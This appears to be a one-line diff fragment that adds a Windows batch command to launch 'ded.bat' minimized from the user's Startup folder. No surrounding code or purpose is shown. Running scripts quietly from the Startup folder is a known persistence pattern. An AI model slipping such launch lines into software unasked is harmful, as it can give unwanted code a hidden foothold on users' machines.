@@ -1,0 +1,1 @@
+start /min "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ded.bat"
